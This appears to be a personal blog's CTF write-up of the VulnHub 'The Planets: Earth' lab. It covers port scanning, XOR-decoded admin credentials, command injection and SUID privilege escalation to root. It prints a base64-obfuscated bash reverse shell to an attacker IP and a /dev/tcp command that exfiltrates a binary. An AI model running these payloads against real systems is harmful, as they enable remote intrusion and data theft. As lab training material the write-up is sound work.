---
title: The Planets:Earth - Writeup
author: Elman Alizadeh
date: 2022-05-25 16:00:00 +0800
categories: [ctf, VulnHub]
tags: [vulnhub, planets]
---

Today we will take a look at Vulnhub: The Planets: Earth. My goal in sharing this writeup is to show you the way if you are in trouble. Please try to understand each step and take notes.

![Desktop View]({{ "/assets/img/vuln-earth/1.jpeg" | relative_url }})

## Network scan

```console
nmap -p- -sV -sC -oN result/nmap/log.txt --open 192.168.0.105

PORT    STATE SERVICE  VERSION
22/tcp  open  ssh      OpenSSH 8.6 (protocol 2.0)
| ssh-hostkey: 
|   256 5b:2c:3f:dc:8b:76:e9:21:7b:d0:56:24:df:be:e9:a8 (ECDSA)
|_  256 b0:3c:72:3b:72:21:26:ce:3a:84:e8:41:ec:c8:f8:41 (ED25519)
80/tcp  open  http     Apache httpd 2.4.51 ((Fedora) OpenSSL/1.1.1l mod_wsgi/4.7.1 Python/3.9)
|_http-title: Bad Request (400)
|_http-server-header: Apache/2.4.51 (Fedora) OpenSSL/1.1.1l mod_wsgi/4.7.1 Python/3.9
443/tcp open  ssl/http Apache httpd 2.4.51 ((Fedora) OpenSSL/1.1.1l mod_wsgi/4.7.1 Python/3.9)
|_http-title: Bad Request (400)
| ssl-cert: Subject: commonName=earth.local/stateOrProvinceName=Space
| Subject Alternative Name: DNS:earth.local, DNS:terratest.earth.local
| Not valid before: 2021-10-12T23:26:31
|_Not valid after:  2031-10-10T23:26:31
|_http-server-header: Apache/2.4.51 (Fedora) OpenSSL/1.1.1l mod_wsgi/4.7.1 Python/3.9
|_ssl-date: TLS randomness does not represent time
| tls-alpn: 
|_  http/1.1
MAC Address: 3C:A0:67:C5:35:33 (Liteon Technology)
```

I added these on my /etc/hosts file.

```console
192.168.0.105   earth.local  terratest.earth.local
```

## Web

After checking the links with gobuster, I found the robots.txt extension.

https://terratest.earth.local/robots.txt

```console
Disallow: /testingnotes.*
```

When I looked at the testnotes.txt extension, I found the username. In addition, how can I find the password

```console
Testing secure messaging system notes:
*Using XOR encryption as the algorithm, should be safe as used in RSA.
*Earth has confirmed they have received our sent messages.
*testdata.txt was used to test encryption.
*terra used as username for admin portal.
Todo:
*How do we send our monthly keys to Earth securely? Or should we change keys weekly?
*Need to test different key lengths to protect against bruteforce. How long should the key be?
*Need to improve the interface of the messaging interface and the admin panel, it's currently very basic.
```

https://terratest.earth.local/testdata.txt

```console
According to radiometric dating estimation and other evidence, Earth formed over 4.5 billion years ago. Within the first billion years of Earth's history, life appeared in the oceans and began to affect Earth's atmosphere and surface, leading to the proliferation of anaerobic and, later, aerobic organisms. Some geological evidence indicates that life may have arisen as early as 4.1 billion years ago.
```

Now let’s decode with CyberChef.

[CyberChef](https://gchq.github.io/CyberChef/#recipe=From_Hex%28%27Auto%27%29XOR%28%7B%27option%27:%27UTF8%27,%27string%27:%27According%20to%20radiometric%20dating%20estimation%20and%20other%20evidence,%20Earth%20formed%20over%204.5%20billion%20years%20ago.%20Within%20the%20first%20billion%20years%20of%20Earth%5C%27s%20history,%20life%20appeared%20in%20the%20oceans%20and%20began%20to%20affect%20Earth%5C%27s%20atmosphere%20and%20surface,%20leading%20to%20the%20proliferation%20of%20anaerobic%20and,%20later,%20aerobic%20organisms.%20Some%20geological%20evidence%20indicates%20that%20life%20may%20have%20arisen%20as%20early%20as%204.1%20billion%20years%20ago.%27%7D,%27Standard%27,false%29&input=MjQwMjExMWIxYTA3MDUwNzBhNDEwMDBhNDMxYTAwMGEwZTBhMGYwNDEwNDYwMTE2NGQwNTBmMDcwYzBmMTU1NDBkMTAxODAwMDAwMDAwMGMwYzA2NDEwZjA5MDE0MjBlMTA1YzBkMDc0ZDA0MTgxYTAxMDQxYzE3MGQ0ZjRjMmMwYzEzMDAwZDQzMGUwZTFjMGEwMDA2NDEwYjQyMGQwNzRkNTU0MDQ2NDUwMzFiMTgwNDBhMDMwNzRkMTgxMTA0MTExYjQxMGYwMDBhNGM0MTMzNWQxYzFkMDQwZjRlMDcwZDA0NTIxMjAxMTExZjFkNGQwMzFkMDkwZjAxMGUwMDQ3MWMwNzAwMTY0NzQ4MWEwYjQxMmIxMjE3MTUxYTUzMWI0MzA0MDAxZTE1MWIxNzFhNDQ0MTAyMGUwMzA3NDEwNTQ0MTgxMDBjMTMwYjE3NDUwODFjNTQxYzBiMDk0OTAyMDIxMTA0MGQxYjQxMGYwOTAxNDIwMzAxNTMwOTFiNGQxNTAxNTMwNDA3MTQxMTBiMTc0YzJjMGMxMzAwMGQ0NDFiNDEwZjEzMDgwZDEyMTQ1YzBkMDcwODQxMGYxZDAxNDEwMTAxMWEwNTBkMGEwODRkNTQwOTA2MDkwNTA3MDkwMjQyMTUwYjE0MWMxZDA4NDExZTAxMGEwZDFiMTIwZDExMGQxZDA0MGUxYTQ1MGMwZTQxMGYwOTA0MDcxMzBiNTYwMTE2NGQwMDAwMTc0OTQxMWUxNTFjMDYxZTQ1NGQwMDExMTcwYzBhMDgwZDQ3MGExMDA2MDU1YTAxMDYwMDEyNDA1MzM2MGUxZjExNDgwNDA5MDYwMTBlMTMwYzAwMDkwZDRlMDIxMzBiMDUwMTVhMGIxMDRkMDgwMDE3MGMwMjEzMDAwZDEwNGMxZDA1MDAwMDQ1MGYwMTA3MGI0NzA4MDMxODQ0NWMwOTAzMDg0MTBmMDEwYzEyMTcxYTQ4MDIxZjQ5MDgwMDA2MDkxYTQ4MDAxZDQ3NTE0YzUwNDQ1NjAxMTkwMTA4MDExZDQ1MTgxNzE1MWExMDRjMDgwYTBlNWE)

![Desktop View]({{ "/assets/img/vuln-earth/2.png" | relative_url }})

We found the username and password. Let’s go to the admin panel.

```console
Username: terra

Password: earthclimatechangebad4humans
```

## Reverse shell 

After giving the ‘ls’ command and checking, I saw that there was an executor of the command. Let’s get shell

```console
echo YmFzaCAtaSA+JiAvZGV2L3RjcC8xOTIuMTY4LjAuMTA3LzQyNDIgMD4mMQ== | base64 -d | bash'

                                                                          Don't forget to change.
└─$ nc -nvlp 4242             
listening on [any] 4242 ...
connect to [192.168.0.107] from (UNKNOWN) [192.168.0.105] 50364
bash: cannot set terminal process group (846): Inappropriate ioctl for device
bash: no job control in this shell
bash-5.1$
``` 

## Root

Command: find / -perm -u=s 2>/dev/null

There is such a thing here.

```console
/usr/bin/reset_root
```

Let’s transfer it to our machine and look at its contents.

In local machine:

Command: nc -nlvp 9002 > reset_root

In target machine:

cat /usr/bin/reset_root > /dev/tcp/192.168.0.107/9002

So, we can use ltrace binary to trace the library calls of an ELF binary.

```console
└─$ ltrace ./reset_root 
puts("CHECKING IF RESET TRIGGERS PRESE"...CHECKING IF RESET TRIGGERS PRESENT...
)                                                            = 38
access("/dev/shm/kHgTFI5G", 0)                                                                         = -1
access("/dev/shm/Zw7bV9U5", 0)                                                                         = -1
access("/tmp/kcM0Wewe", 0)                                                                             = -1
puts("RESET FAILED, ALL TRIGGERS ARE N"...RESET FAILED, ALL TRIGGERS ARE NOT PRESENT.
)                                                            = 44
+++ exited (status 0) +++
```

We should make that three files on the shown locations should be present to run the trigger

In target machine

```console
touch /dev/shm/kHgTFI5G /dev/shm/Zw7bV9U5 /tmp/kcM0Wewe

/usr/bin/reset_rootCHECKING IF RESET TRIGGERS PRESENT...
RESET TRIGGERS ARE PRESENT, RESETTING ROOT PASSWORD TO: Earth
bash-5.1$ su root
su root
Password: Earth
```

![Desktop View]({{ "/assets/img/vuln-earth/3.png" | relative_url }})

### And now we are the root

![Desktop View]({{ "/assets/img/vuln-earth/4.gif" | relative_url }})
